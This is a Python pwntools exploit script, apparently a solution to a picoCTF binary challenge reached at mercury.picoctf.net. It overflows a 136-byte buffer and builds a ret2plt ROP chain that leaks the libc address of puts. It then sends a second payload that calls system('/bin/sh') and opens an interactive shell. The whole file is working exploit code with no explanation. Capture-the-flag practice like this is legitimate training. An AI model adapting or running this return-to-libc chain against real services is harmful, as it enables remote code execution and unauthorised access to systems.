from pwn import *

context.binary = elf = ELF("./vuln_patched", checksec=False)
libc = ELF("./libc.so.6")

if args.LOCAL:
    p = process(elf.path)
else:
    p = remote('mercury.picoctf.net' ,1774)

buf = b"A" * 136
rdi = 0x0000000000400913
ret = 0x000000000040052e

ret2plt = flat(
    buf,
    rdi,
    elf.got['puts'],
    elf.plt['puts'],
    elf.sym['main']
)

p.recvline()
p.sendline(ret2plt)
# p.recvuntil(b"0")
p.recvline()

puts_leak = u64(p.recv(6).ljust(8, b"\x00"))
libc.address = puts_leak - libc.sym['puts']
log.success(f"Libc Base ==> {hex(libc.address)}")

pay = flat(
    buf,
    rdi,
    next(libc.search(b'/bin/sh\00')),
    ret,
    libc.sym['system']
)

p.sendline(pay)
p.interactive()